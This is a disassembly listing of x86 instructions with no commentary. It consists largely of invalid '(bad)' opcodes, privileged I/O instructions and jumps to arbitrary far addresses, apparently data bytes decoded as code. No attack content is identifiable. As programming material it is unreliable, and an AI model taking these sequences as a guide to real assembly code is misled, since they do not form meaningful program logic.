  41bd63:	jb     0x41bce7
  41bd65:	cdq    
  41bd66:	stos   DWORD PTR es:[edi],eax
  41bd67:	addr16 (bad) 
  41bd69:	xchg   edx,eax
  41bd6a:	das    
  41bd6b:	push   es
  41bd6c:	pusha  
  41bd6d:	div    DWORD PTR [edi+0x6f]
  41bd70:	xor    eax,0x42e99496
  41bd75:	test   eax,0x6fa0b67a
  41bd7a:	sub    DWORD PTR [edi],ebp
  41bd7c:	inc    ebp
  41bd7d:	mov    ebp,ebp
  41bd7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd80:	add    al,0x77
  41bd82:	cs ins DWORD PTR es:[edi],dx
  41bd84:	pop    ss
  41bd85:	lds    ebx,FWORD PTR ds:0xbaf103bf
  41bd8b:	xchg   BYTE PTR [edi+eax*4-0x5213b5d3],dh
  41bd92:	push   ss
  41bd93:	nop
  41bd94:	push   es
  41bd95:	test   cl,bh
  41bd97:	mov    edi,0xeb3dbaa3
  41bd9c:	aas    
  41bd9d:	int3   
  41bd9e:	cmp    DWORD PTR [esi],esp
  41bda0:	pop    eax
  41bda1:	test   BYTE PTR ds:0x17dd4aa4,dh
  41bda7:	push   edi
  41bda8:	fdivr  QWORD PTR [edx-0x879bf79]
  41bdae:	jno    0x41bdc6
  41bdb0:	push   esp
  41bdb1:	xchg   ecx,eax
  41bdb2:	(bad)  
  41bdb3:	and    eax,0x32d9815c
  41bdb8:	xchg   BYTE PTR [esi-0x2],bh
  41bdbb:	cmp    ebx,DWORD PTR [ebx+0x6a6b9ccc]
  41bdc1:	in     al,0x84
  41bdc3:	cmp    eax,0x17c313a6
  41bdc8:	js     0x41bdd5
  41bdca:	cld    
  41bdcb:	call   0x528b4cef
  41bdd0:	inc    eax
  41bdd1:	popf   
  41bdd2:	movntq QWORD PTR [eax+0x41],mm4
  41bdd6:	ret    
  41bdd7:	dec    edi
  41bdd8:	loope  0x41be59
  41bdda:	lods   eax,DWORD PTR ds:[esi]
  41bddb:	jmp    0xbe73f557
  41bde0:	iret   
  41bde1:	pop    ds
  41bde2:	das    
  41bde3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bde4:	retf   
  41bde5:	cdq    
  41bde6:	add    dl,BYTE PTR [edx+0x4d]
  41bde9:	or     ebp,edi
  41bdeb:	dec    edi
  41bdec:	in     eax,0x7
  41bdee:	mov    ebx,0xb09748b5
  41bdf3:	mov    ?,WORD PTR [esi+0x44]
  41bdf6:	xchg   ebp,esp
  41bdf8:	sub    dl,bh
  41bdfa:	test   eax,0x7328ca90
  41bdff:	pushf  
  41be00:	out    0xa2,al
  41be02:	jmp    0xe22:0x7dcdcf31
  41be09:	and    eax,0x1d855a0
  41be0e:	mov    edx,0x2333c24c
  41be13:	xchg   ebp,eax
  41be14:	lods   al,BYTE PTR ds:[esi]
  41be15:	icebp  
  41be16:	shl    DWORD PTR [ecx+0x39ffbd45],1
  41be1c:	sub    dl,BYTE PTR [ecx+0x18]
  41be1f:	into   
  41be20:	and    dh,BYTE PTR [edx]
  41be22:	gs jnp 0x41be82
  41be25:	mov    ecx,DWORD PTR [esi+ebx*4]
  41be28:	xchg   ebx,eax
  41be29:	sub    DWORD PTR [edx],edx
  41be2b:	jno    0x41be66
  41be2d:	stc    
  41be2e:	xchg   DWORD PTR [edi],ebx
  41be30:	pop    es
  41be31:	pop    edx
  41be32:	jp     0x41bdf4
  41be34:	or     ecx,DWORD PTR [esi-0x11]
  41be37:	mov    ds:0xc0879e5b,eax
  41be3c:	mov    ebp,0x34af16d1
  41be41:	iret   
  41be42:	icebp  
  41be43:	jo     0x41be6b
  41be45:	fld    DWORD PTR [eax]
  41be47:	sub    eax,ebx
  41be49:	aam    0x6f
  41be4b:	call   FWORD PTR [edx-0x70]
  41be4e:	jmp    0x41be45
  41be50:	cmp    al,0x10
  41be52:	loopne 0x41be89
  41be54:	adc    eax,0xe01b6f21
  41be59:	jne    0x41be3a
  41be5b:	xchg   esi,eax
  41be5d:	or     DWORD PTR ds:[ebp-0x7aebc856],edx
  41be64:	jb     0x41beb7
  41be66:	stos   DWORD PTR es:[edi],eax
  41be67:	fs sub eax,0xbbe24121
  41be6d:	ss inc ebx
  41be6f:	pop    ds
  41be70:	sbb    ch,al
  41be72:	aaa    
  41be73:	sbb    ah,BYTE PTR [ebp+edx*1-0x89300f2]
  41be7a:	mov    ebp,ebp
  41be7c:	add    eax,0xacfa686
  41be81:	sub    BYTE PTR [edx+0x672fd058],ch
  41be87:	stos   BYTE PTR es:[edi],al
  41be88:	pop    ecx
  41be89:	dec    ebp
  41be8a:	pop    esi
  41be8b:	rcl    DWORD PTR [ecx-0x6f],cl
  41be8e:	sbb    DWORD PTR [esi-0x29605b22],0xb
  41be95:	push   ebp
  41be96:	add    esi,DWORD PTR [ebp+esi*2+0x68]
  41be9a:	or     al,0x9d
  41be9c:	cmp    esp,eax
  41be9e:	mov    cl,0xe2
  41bea0:	sub    ebp,DWORD PTR [eax-0x10bfdd0d]
  41bea6:	fmulp  st(4),st
  41bea8:	dec    esi
  41bea9:	iret   
  41beaa:	mov    ebx,0x57e65768
  41beaf:	adc    BYTE PTR [ebp+ebp*1-0x29],dh
  41beb3:	adc    al,0x3e
  41beb5:	repz xchg edi,eax
  41beb7:	pushf  
  41beb8:	inc    esi
  41beb9:	stos   BYTE PTR es:[edi],al
  41beba:	adc    eax,DWORD PTR [ebx+0x7d]
  41bebd:	lahf   
  41bebe:	or     eax,0x57e805ca
  41bec3:	push   ebx
  41bec4:	(bad)  
  41bec5:	xchg   edx,eax
  41bec6:	add    ecx,DWORD PTR [ebp+0x549b4b4]
  41becc:	jle    0x41bebb
  41bece:	aas    
  41becf:	and    eax,ecx
  41bed1:	fwait
  41bed2:	stc    
  41bed3:	dec    esi
  41bed4:	(bad)
  41bed7:	jmp    0x1db2cb14
  41bedc:	inc    edx
  41bedd:	call   0xf337:0xce985b1e
  41bee4:	cmp    BYTE PTR ds:0x8ba5573b,cl
  41beea:	or     esp,DWORD PTR [eax]
  41beec:	inc    ebx
  41beed:	pusha  
  41beee:	sbb    DWORD PTR [edx],0xffffffb8
  41bef1:	mov    cl,0x4a
  41bef3:	jp     0x41beb4
  41bef5:	inc    ebp
  41bef6:	dec    esi
  41bef7:	cmp    ecx,edx
  41bef9:	call   0x599a0451
  41befe:	cmc    
  41beff:	je     0x41bee9
  41bf01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf02:	pop    ecx
  41bf03:	xor    eax,DWORD PTR [eax-0x4c8ce786]
  41bf09:	inc    edi
  41bf0a:	xchg   DWORD PTR [ebx+0x2b],esi
  41bf0d:	das    
  41bf0e:	mov    bh,0xa2
  41bf10:	inc    ebx
  41bf11:	or     eax,0xa34e6b7b
  41bf16:	ds xchg edi,eax
  41bf18:	and    al,0xe
  41bf1a:	repz pusha 
  41bf1c:	xor    bh,BYTE PTR [edi+ebx*1+0x19c3cdbc]
  41bf23:	(bad)  
  41bf24:	ror    ecx,cl
  41bf26:	clc    
  41bf27:	cs or  eax,0x7b8afa76
  41bf2d:	(bad)  
  41bf2f:	jp     0x41bebe
  41bf31:	cwde   
  41bf32:	out    0x52,al
  41bf34:	stos   BYTE PTR es:[edi],al
  41bf35:	lea    ecx,[ecx+0x62]
  41bf38:	test   BYTE PTR [esi+0x5c],bh
  41bf3b:	rol    DWORD PTR [ecx+edx*1-0x58],cl
  41bf3f:	fstp   QWORD PTR [edx]
  41bf41:	jne    0x41bf9d
  41bf43:	and    DWORD PTR [ebx-0x1a612aa1],eax
  41bf49:	mov    esi,0x30acd509
  41bf4e:	push   es
  41bf4f:	mov    ch,0x97
  41bf51:	cmp    al,BYTE PTR [esi+0x33]
  41bf54:	in     eax,dx
  41bf55:	(bad)  
  41bf56:	lock lock mov ebx,0x74d29d88
  41bf5d:	mov    edx,0x9a6d1764
  41bf62:	outs   dx,BYTE PTR ds:[esi]
  41bf63:	cmp    al,0x57
  41bf65:	mov    ds,WORD PTR [ebx+0x23]
  41bf68:	je     0x41bf19
  41bf6a:	call   0xc6c3c767
  41bf6f:	imul   ebx,esi,0x39
  41bf72:	jg     0x41bf1e
  41bf74:	cmp    BYTE PTR [edi],0xef
  41bf77:	sub    al,0xfb
  41bf79:	test   ebx,esi
  41bf7b:	mov    dh,0xf6
  41bf7d:	sbb    eax,0x4b0e0b70
  41bf82:	cs aaa 
  41bf84:	ins    BYTE PTR es:[edi],dx
  41bf85:	jo     0x41bf65
  41bf87:	mov    edx,0xbacc5a4c
  41bf8c:	enter  0xe58c,0xd4
  41bf90:	jno    0x41bf82
  41bf92:	cs (bad) 
  41bf94:	(bad)  
  41bf95:	xlat   BYTE PTR ds:[ebx]
  41bf96:	cmp    eax,0x135641eb
  41bf9b:	int3   
  41bf9c:	inc    ebp
  41bf9d:	shr    DWORD PTR [esi+0x690a2c43],1
  41bfa3:	sub    edx,ebp
  41bfa5:	cmc    
  41bfa6:	cmp    edi,esi
  41bfa8:	or     BYTE PTR [esi+0x7f951b09],ch
  41bfae:	ret    0xadb
  41bfb1:	dec    edx
  41bfb2:	loope  0x41bfa5
  41bfb4:	sti    
  41bfb5:	pop    ds
  41bfb6:	mov    edi,0xddb7bb10
  41bfbb:	inc    ebp
  41bfbc:	mov    esp,0xd2f52bf1
  41bfc1:	cmc    
  41bfc2:	xchg   ebx,eax
  41bfc3:	fcom   QWORD PTR [eax-0xe]
  41bfc6:	jp     0x41bfc7
  41bfc8:	ins    BYTE PTR es:[edi],dx
  41bfc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfcb:	nop
  41bfcc:	cmpxchg DWORD PTR [esi-0x17],ebp
  41bfd0:	(bad)  [eax+0x12]
  41bfd3:	push   dx
  41bfd5:	rol    DWORD PTR [esp+edi*8-0x67],1
  41bfd9:	sbb    BYTE PTR [ebp-0x2e],bl
  41bfdc:	dec    esi
  41bfdd:	lock add BYTE PTR [edx-0x1b],dh
  41bfe1:	jno    0x41bfbd
  41bfe3:	mov    ah,0xf0
  41bfe5:	repz mov ds:0xd8a14006,al
  41bfeb:	adc    dh,bl
  41bfed:	ds hlt 
  41bfef:	js     0x41bfae
  41bff1:	and    DWORD PTR [edi+0xd],ecx
  41bff4:	pop    edx
  41bff5:	xchg   edi,eax
  41bff6:	test   eax,0x3be5678b
  41bffb:	ins    BYTE PTR es:[edi],dx
  41bffc:	jnp    0x41c00d
  41bffe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfff:	addr16 daa 
  41c001:	int3   
  41c002:	aam    0xc
  41c004:	sub    BYTE PTR [edx],al
  41c006:	xor    bh,BYTE PTR [edi+ebp*2+0x24c0ea76]
  41c00d:	pushf  
  41c00e:	shr    DWORD PTR [ebx-0x509f3f33],0xdd
  41c015:	mov    ah,0x0
  41c017:	imul   BYTE PTR [edi-0x65]
  41c01a:	shl    ebx,0xf
  41c01d:	dec    ecx
  41c01e:	xchg   ecx,eax
  41c01f:	cwde   
  41c020:	push   ebp
  41c021:	hlt    
  41c022:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c023:	fist   WORD PTR [ebx-0x42]
  41c026:	clc    
  41c027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c028:	push   0xddb61b19
  41c02d:	cmp    al,0xeb
  41c02f:	in     al,0xf9
  41c031:	std    
  41c032:	enter  0x4b16,0xc4
  41c036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c037:	aas    
  41c038:	or     al,0x14
  41c03a:	hlt    
  41c03b:	retf   0xeac8
  41c03e:	mov    ah,0x15
  41c040:	scas   eax,DWORD PTR es:[edi]
  41c041:	mov    ebp,0x6117c23e
  41c046:	ret    0x60c2
  41c049:	into   
  41c04a:	lea    edi,[bp+si-0xcc1]
  41c04f:	xor    al,0xb4
  41c051:	adc    eax,0xd67c3e35
  41c056:	push   edi
  41c057:	mov    edi,0xf32a248e
  41c05c:	sbb    ebx,DWORD PTR [edx+0x7a]
  41c05f:	bound  edx,QWORD PTR [edi+ebp*1+0x9ced361]
  41c066:	lahf   
  41c067:	pop    esp
  41c068:	or     DWORD PTR [edx-0x2],edx
  41c06b:	aas    
  41c06c:	js     0x41c009
  41c06e:	sbb    bl,BYTE PTR [eax+ecx*2-0x57fe8e8d]
  41c075:	push   esp
  41c076:	loope  0x41c07a
  41c078:	xor    al,0x80
  41c07a:	ins    DWORD PTR es:[edi],dx
  41c07b:	xor    eax,0x2fc46af4
  41c080:	xchg   ebp,eax
  41c081:	fwait
  41c082:	mov    edx,0x5bdb46b7
  41c087:	add    BYTE PTR [edx+0x53],dh
  41c08a:	lahf   
  41c08b:	pop    ebx
  41c08c:	mov    ch,BYTE PTR [ecx+0x1c]
  41c08f:	out    0xe7,eax
  41c091:	jecxz  0x41c082
  41c093:	pop    ss
  41c094:	gs leave 
  41c096:	mov    esp,0xe5f3c291
  41c09b:	xor    edx,DWORD PTR [ecx]
  41c09d:	lds    edx,FWORD PTR [ecx]
  41c09f:	ret    
  41c0a0:	jg     0x41c0a1
  41c0a2:	(bad)  
  41c0a3:	stc    
  41c0a4:	add    eax,0x363248ad
  41c0a9:	adc    dh,BYTE PTR [edx]
  41c0ab:	sbb    eax,0xa4d7ac42
  41c0b0:	retf   
  41c0b1:	xor    eax,0x9e8ac472
  41c0b6:	mov    ebp,0x48f22ae4
  41c0bb:	xchg   DWORD PTR [esi+edi*8],eax
  41c0be:	pop    ebp
  41c0bf:	sub    ch,0x46
  41c0c2:	jle    0x41c072
  41c0c4:	adc    al,0x5a
  41c0c6:	mov    BYTE PTR [esi],dl
  41c0c8:	sub    ebx,esp
  41c0ca:	jns    0x41c10e
  41c0cc:	enter  0x96b7,0x6b
  41c0d0:	out    0x19,eax
  41c0d2:	xchg   BYTE PTR [edi*2+0x779b981c],ch
  41c0d9:	enter  0xf859,0x91
  41c0dd:	shl    BYTE PTR [ecx+0x43],cl
  41c0e0:	mov    esi,0x9cd4cbd
  41c0e5:	out    dx,al
  41c0e6:	or     ch,BYTE PTR [ebx]
  41c0e8:	or     BYTE PTR [esi-0x674ac02b],0x65
  41c0ef:	popa   
  41c0f0:	pop    eax
  41c0f1:	add    eax,0xb1621268
  41c0f6:	sbb    al,0x15
  41c0f8:	add    BYTE PTR [edx+0xe],0xbe
  41c0fc:	pop    es
  41c0fd:	jo     0x41c0ca
  41c0ff:	dec    ecx
  41c100:	loop   0x41c104
  41c102:	sbb    DWORD PTR [edi-0x110198ba],ebp
  41c108:	pop    sp
  41c10a:	pop    ds
  41c10b:	loopne 0x41c144
  41c10d:	jo     0x41c091
  41c10f:	xchg   edi,eax
  41c110:	fs (bad) 
  41c112:	pop    ds
  41c113:	xor    cl,dh
  41c115:	les    edi,FWORD PTR [ecx]
  41c117:	sbb    ch,al
  41c119:	in     eax,0x68
  41c11b:	imul   edi,DWORD PTR [edi+ebp*1+0x5867f723],0xffffff89
  41c123:	fild   DWORD PTR ds:0x82d69f4a
  41c129:	inc    esp
  41c12a:	or     edi,DWORD PTR [edx-0x1e5286f7]
  41c130:	or     al,0xd3
  41c132:	sbb    eax,0x15de45bf
  41c137:	push   esi
  41c138:	out    0xe5,al
  41c13a:	aad    0xae
  41c13c:	or     eax,0x6f2e206e
  41c141:	add    eax,0xbd397cf5
  41c146:	push   0xbbed063a
  41c14b:	sub    DWORD PTR [edx+0x41],ecx
  41c14e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c14f:	dec    esp
  41c150:	sub    esp,DWORD PTR es:[ecx+edi*2-0x6b]
  41c155:	sbb    edi,DWORD PTR [edi]
  41c157:	xor    eax,0x3a2ad16a
  41c15c:	stos   DWORD PTR es:[edi],eax
  41c15d:	cwde   
  41c15e:	aas    
  41c15f:	aas    
  41c160:	dec    ecx
  41c161:	or     DWORD PTR ds:0x26b253a4,0x5145691
  41c16b:	icebp  
  41c16c:	inc    eax
  41c16d:	fidivr DWORD PTR [esi+0x42]
  41c170:	adc    eax,0x1702eb60
  41c175:	dec    edi
  41c176:	outs   dx,BYTE PTR ds:[esi]
  41c177:	sub    bl,bl
  41c179:	pop    esi
  41c17a:	ss inc esp
  41c17c:	call   0x436b:0xb5b59ec5
  41c183:	pop    esp
  41c184:	cld    
  41c185:	mov    ebp,0x4eadb7c8
  41c18a:	inc    esi
  41c18b:	or     ch,BYTE PTR [edi-0x5c]
  41c18e:	nop
  41c18f:	push   0xffffffbd
  41c191:	fcmovne st,st(3)
  41c193:	imul   DWORD PTR [esi]
  41c195:	outs   dx,DWORD PTR ds:[esi]
  41c196:	iret   
  41c197:	clc    
  41c198:	sub    BYTE PTR [ecx-0x54],0xcc
  41c19c:	pop    esp
  41c19d:	xchg   edx,eax
  41c19e:	dec    ebx
  41c19f:	call   0xe979ac18
  41c1a4:	sbb    BYTE PTR [edx-0x41],bh
  41c1a7:	mov    cs,WORD PTR [ebx+0x37adcf78]
  41c1ad:	cmp    DWORD PTR [edx],eax
  41c1af:	pop    ebx
  41c1b0:	xchg   ebx,eax
  41c1b1:	dec    edx
  41c1b2:	outs   dx,DWORD PTR ds:[esi]
  41c1b3:	inc    esp
  41c1b4:	push   ecx
  41c1b5:	xchg   ecx,eax
  41c1b6:	push   cs
  41c1b7:	jae    0x41c160
  41c1b9:	ins    DWORD PTR es:[edi],dx
  41c1ba:	cli    
  41c1bb:	fisubr DWORD PTR [esi]
  41c1bd:	hlt    
  41c1be:	ret    
  41c1bf:	push   es
  41c1c0:	mov    BYTE PTR [edi+ebx*2],ch
  41c1c3:	pop    esp
  41c1c4:	mov    ebx,0xad90ed61
  41c1c9:	dec    edi
  41c1ca:	jae    0x41c193
  41c1cc:	(bad)  
  41c1cd:	sub    ecx,DWORD PTR [ecx+0x9]
  41c1d0:	ins    BYTE PTR es:[edi],dx
  41c1d1:	repz out 0x73,al
  41c1d4:	mov    cl,0xe7
  41c1d6:	inc    ebx
  41c1d7:	das    
  41c1d8:	enter  0x1567,0x62
  41c1dc:	fsubp  st(3),st
  41c1de:	inc    esi
  41c1df:	pop    edi
  41c1e0:	push   esi
  41c1e1:	sbb    eax,0x6d9b7ca7
  41c1e6:	nop
  41c1e7:	mov    esi,0xf1272392
  41c1ec:	outs   dx,BYTE PTR ds:[esi]
  41c1ed:	ja     0x41c18e
  41c1ef:	inc    edx
  41c1f0:	mov    eax,0xe3d2e4af
  41c1f5:	das    
  41c1f6:	fimul  DWORD PTR [ebp+0x4d9de816]
  41c1fc:	mov    dl,0xa1
  41c1fe:	sub    cl,BYTE PTR [ebx-0x2a]
  41c201:	xor    eax,ecx
  41c203:	push   es
  41c204:	enter  0x1414,0xfb
  41c208:	jno    0x41c1a4
  41c20a:	jnp    0x41c260
  41c20c:	pop    esp
  41c20d:	shl    DWORD PTR [eax+0x414fc72a],0x57
  41c214:	lods   al,BYTE PTR ds:[esi]
  41c215:	lock loope 0x41c1b6
  41c218:	pop    edi
  41c219:	mov    eax,ds:0x750670c8
  41c21e:	(bad)  
  41c21f:	cmp    DWORD PTR [edi],ebp
  41c221:	jmp    0x41c1f0
  41c223:	mov    al,0xe8
  41c225:	sbb    esi,edx
  41c227:	fild   WORD PTR [edx]
  41c229:	mov    esi,0x6b25bcf
  41c22e:	aad    0x4a
  41c230:	and    BYTE PTR [esi+0x78],0xe6
  41c234:	mov    ds:0x7b4ae359,al
  41c239:	out    dx,eax
  41c23a:	daa    
  41c23b:	jno    0x41c200
  41c23d:	dec    esi
  41c23e:	or     edi,edi
  41c240:	jmp    0xfad3a6ec
  41c245:	push   ebp
  41c246:	in     eax,0xfc
  41c248:	test   BYTE PTR [esi+0x9],bh
  41c24b:	xchg   ebp,eax
  41c24c:	shl    DWORD PTR [ecx-0x70],0xb7
  41c250:	in     eax,dx
  41c251:	pop    edi
  41c252:	xor    DWORD PTR [ecx+0x76],ecx
  41c255:	mov    BYTE PTR [ebp-0x7363665],bh
  41c25b:	sbb    ebp,eax
  41c25d:	shl    BYTE PTR [edx+0x4e],cl
  41c260:	mov    ebp,eax
  41c262:	iret   
  41c263:	push   0xffffffb9
  41c265:	shl    al,cl
  41c267:	clc    
  41c268:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c269:	pop    ebx
  41c26a:	icebp  
  41c26b:	fwait
  41c26c:	das    
  41c26d:	clc    
  41c26e:	dec    ecx
  41c26f:	fwait
  41c270:	rcr    ecx,cl
  41c272:	mov    esp,0x7c0059cc
  41c277:	xchg   ebp,eax
  41c278:	rcr    DWORD PTR [edx-0x5be565d0],1
  41c27e:	adc    BYTE PTR [esi+0x70f1c55e],dh
  41c284:	sbb    ebx,DWORD PTR [ecx]
  41c286:	or     dl,0x31
  41c289:	retf   
  41c28a:	adc    edx,DWORD PTR [ebx+0x107473ab]
  41c290:	push   edi
  41c291:	nop
  41c292:	sbb    eax,0xf2982fa0
  41c297:	popa   
  41c298:	or     bh,ah
  41c29a:	ins    BYTE PTR es:[edi],dx
  41c29b:	jmp    0x2a93299
  41c2a0:	dec    esi
  41c2a1:	pop    eax
  41c2a2:	mov    edx,0x57807ea1
  41c2a7:	adc    BYTE PTR [edx+edi*8-0x61],0x85
  41c2ac:	mov    WORD PTR [edx],?
  41c2ae:	das    
  41c2af:	test   DWORD PTR [edi-0x1974fbf9],edi
  41c2b5:	call   0x585:0xbc06c5f0
  41c2bc:	push   0xc0fc8063
  41c2c1:	add    esp,edi
  41c2c3:	ins    DWORD PTR es:[edi],dx
  41c2c4:	jmp    0x403c:0xb66c6f24
  41c2cb:	jmp    0x484f:0x17cf69b
  41c2d2:	scas   al,BYTE PTR es:[edi]
  41c2d3:	(bad)  
  41c2d5:	sbb    DWORD PTR [ebp+eax*2-0x14590dd7],edx
  41c2dc:	shl    BYTE PTR [ecx+ecx*2],1
  41c2df:	aad    0x3f
  41c2e1:	stos   DWORD PTR es:[edi],eax
  41c2e2:	xchg   esi,eax
  41c2e3:	dec    ebp
  41c2e4:	jns    0x41c2f4
  41c2e6:	sub    ebx,DWORD PTR [esi+0x76]
  41c2e9:	fidiv  WORD PTR ds:0x56fa4fd2
  41c2ef:	fisttp DWORD PTR [ecx-0x4a7b51a4]
  41c2f5:	adc    ch,BYTE PTR ss:0xbcf27e4
  41c2fc:	push   cs
  41c2fd:	lods   al,BYTE PTR ds:[esi]
  41c2fe:	jmp    0x41c34e
  41c300:	out    dx,al
  41c301:	push   edx
  41c302:	pushf  
  41c303:	sbb    al,0xdd
  41c305:	lock in eax,dx
  41c307:	and    BYTE PTR [edx-0xa4d1b7c],bh
  41c30d:	icebp  
  41c30e:	loop   0x41c359
  41c310:	fadd   DWORD PTR [edi]
  41c312:	lahf   
  41c313:	hlt    
  41c314:	push   ecx
  41c315:	mov    ds:0xb215c425,eax
  41c31a:	push   esi
  41c31b:	push   edi
  41c31c:	(bad)  
  41c31d:	jmp    0xb7944004
  41c322:	xchg   edx,eax
  41c323:	aad    0x9e
  41c325:	and    eax,0x8f300fc1
  41c32a:	mov    eax,0xae08446e
  41c32f:	lock fiadd DWORD PTR [esi-0x339c659b]
  41c336:	sbb    BYTE PTR [ebx+0x6583130a],cl
  41c33c:	out    0xd,eax
  41c33e:	mov    al,0x28
  41c340:	jecxz  0x41c359
  41c342:	push   ebp
  41c343:	mov    eax,ds:0x34c4386e
  41c348:	mov    esp,0x7e702fac
  41c34d:	clc    
  41c34e:	jo     0x41c3ab
  41c350:	lods   eax,DWORD PTR ds:[esi]
  41c352:	call   DWORD PTR [ebx-0x195bb209]
  41c358:	xor    eax,0x8e206465
  41c35d:	loopne 0x41c3a9
  41c35f:	(bad)  
  41c360:	sub    al,0xbe
  41c362:	push   cs
  41c363:	push   cs
  41c364:	in     al,dx
  41c365:	outs   dx,DWORD PTR ds:[esi]
  41c366:	jp     0x41c389
  41c368:	ss cld 
  41c36a:	and    al,0xe1
  41c36c:	pop    ecx
  41c36d:	sub    al,0x32
  41c36f:	gs inc edx
  41c371:	and    ah,BYTE PTR [esp+ebx*2+0x6a]
  41c375:	xchg   esi,eax
  41c376:	pop    es
  41c377:	fstp   TBYTE PTR [edi+0xc]
  41c37a:	xor    eax,0x9a50d2b1
  41c37f:	cs pop ecx
  41c381:	mov    fs,WORD PTR ds:0xc6107974
  41c387:	push   cs
  41c388:	pop    es
  41c389:	or     BYTE PTR [ebx],dh
  41c38b:	test   eax,0xa5ac7cf3
  41c390:	dec    ebp
  41c391:	int3   
  41c392:	mov    esi,0xc3a1d0d7
  41c397:	jle    0x41c3a0
  41c399:	mov    esi,0x4172ed33
  41c39e:	xchg   esp,eax
  41c39f:	jg     0x41c3a2
  41c3a1:	loop   0x41c3d3
  41c3a3:	ds inc edx
  41c3a5:	int3   
  41c3a6:	scas   al,BYTE PTR es:[edi]
  41c3a7:	sbb    edi,DWORD PTR [ecx+0x72]
  41c3aa:	inc    ebx
  41c3ab:	push   0x26
  41c3ad:	push   eax
  41c3af:	call   0xbe97a7a4
  41c3b4:	addr16 call 0x8a75:0x8b47c479
  41c3bc:	mov    eax,0xbcedc3ed
  41c3c1:	gs xchg esi,eax
  41c3c3:	gs out dx,al
  41c3c5:	push   0xffffffab
  41c3c7:	repz mov ecx,0xc4d2cf81
  41c3cd:	mov    ch,0xc
  41c3cf:	xor    ebp,DWORD PTR [ebx+eax*4-0x5]
  41c3d3:	inc    ebx
  41c3d4:	mov    ch,0x6
  41c3d6:	sahf   
  41c3d7:	xor    ecx,edx
  41c3d9:	add    edx,DWORD PTR [ebx-0x687c701]
  41c3df:	aaa    
  41c3e0:	xor    BYTE PTR [edi+0x71],ch
  41c3e3:	mov    ah,BYTE PTR [esi+ebp*4]
  41c3e6:	sub    esi,DWORD PTR [esi]
  41c3e8:	popa   
  41c3e9:	mov    edi,DWORD PTR [ebx+0x46]
  41c3ec:	neg    BYTE PTR [ebp-0x7a1a5d61]
  41c3f2:	lock mov edx,0x2795acef
  41c3f8:	mov    edx,0xfbce2467
  41c3fd:	stos   BYTE PTR es:[edi],al
  41c3fe:	adc    BYTE PTR [esi+esi*1-0x14],dl
  41c402:	jp     0x41c41a
  41c404:	cdq    
  41c405:	pop    edi
  41c406:	pop    edx
  41c407:	push   esp
  41c409:	scas   eax,DWORD PTR es:[edi]
  41c40a:	ror    dl,1
  41c40c:	jb     0x41c414
  41c40e:	pop    ds
  41c40f:	pop    ds
  41c410:	add    cl,BYTE PTR [ebp+0x40]
  41c413:	fsub   QWORD PTR [ebp-0x19939a86]
  41c419:	mov    edx,0x81d241b9
  41c41e:	clc    
  41c41f:	mov    ecx,0xa2e0a0a6
  41c424:	rol    dl,cl
  41c426:	retf   
  41c427:	pop    ss
  41c428:	arpl   WORD PTR [edi+0x1557b56f],sp
  41c42e:	cmp    BYTE PTR [eax-0x34365fe],ah
  41c434:	mov    ds:0xf9c525a0,al
  41c439:	push   ds
  41c43a:	(bad)  
  41c43b:	push   eax
  41c43c:	(bad)  
  41c43d:	fnstsw WORD PTR [eax-0x2964d4df]
  41c443:	jle    0x41c43e
  41c445:	fwait
  41c446:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c447:	cdq    
  41c448:	mov    eax,0x50464d0b
  41c44d:	lods   eax,DWORD PTR ds:[esi]
  41c44e:	pop    ebx
  41c44f:	push   esi
  41c450:	mov    WORD PTR [ebp-0x11a4bca9],cs
  41c456:	cli    
  41c457:	and    eax,0xe5bbce4e
  41c45c:	inc    ecx
  41c45d:	adc    BYTE PTR [ebx-0x7f],ch
  41c460:	xor    eax,0x8c811a3c
  41c465:	gs mov bl,0xe6
  41c468:	mov    cl,0x5f
  41c46a:	push   edi
  41c46b:	or     al,0x2f
  41c46d:	jnp    0x41c4b5
  41c46f:	ss adc al,0x96
  41c472:	and    ch,BYTE PTR [edx+0x7f621ed8]
  41c478:	mov    cl,0x65
  41c47a:	popf   
  41c47b:	fisttp WORD PTR [ecx-0x10]
  41c47e:	or     al,0x99
  41c480:	arpl   WORD PTR [ecx-0x6a5eff9f],si
  41c486:	(bad)  
  41c487:	fisub  DWORD PTR [ebp+0x206e0d67]
  41c48d:	jecxz  0x41c415
  41c48f:	daa    
  41c490:	adc    eax,0xccd4f999
  41c495:	jp     0x41c460
  41c497:	jb     0x41c4b4
  41c499:	in     al,0x5d
  41c49b:	fisttp DWORD PTR ds:0x119cbb73
  41c4a1:	imul   ebx,DWORD PTR [edx+0x5fc46bef],0xee4345b2
  41c4ab:	lds    ecx,FWORD PTR [ebx]
  41c4ad:	sub    DWORD PTR [eax+0x5c363099],esp
  41c4b3:	sub    al,0x8c
  41c4b6:	cld    
  41c4b7:	data16 cmp al,0x97
  41c4ba:	and    ebp,DWORD PTR [ebp-0x2f2a03dd]
  41c4c0:	icebp  
  41c4c1:	sbb    al,BYTE PTR [eax-0x7b]
  41c4c4:	cmp    BYTE PTR [ebp+0x78],ch
  41c4c7:	mov    edi,0xb8a734cc
  41c4cc:	cmp    al,0xa0
  41c4cf:	outs   dx,DWORD PTR ds:[esi]
  41c4d0:	inc    ebp
  41c4d1:	ja     0x41c4c3
  41c4d3:	rcl    DWORD PTR [ebp-0x52],cl
  41c4d6:	add    DWORD PTR [ecx-0x50697ec7],ecx
  41c4dc:	(bad)  
  41c4de:	pop    eax
  41c4df:	bound  eax,QWORD PTR [esi]
  41c4e1:	sub    BYTE PTR [edx-0x4],cl
  41c4e4:	inc    edi
  41c4e5:	sub    eax,0x29fa3fc3
  41c4ea:	arpl   WORD PTR [ebx+0x4f259375],di
  41c4f0:	mov    esp,eax
  41c4f2:	(bad)  
  41c4f3:	mul    BYTE PTR [eax+0x1da81a7f]
  41c4f9:	sub    eax,0xaed550cd
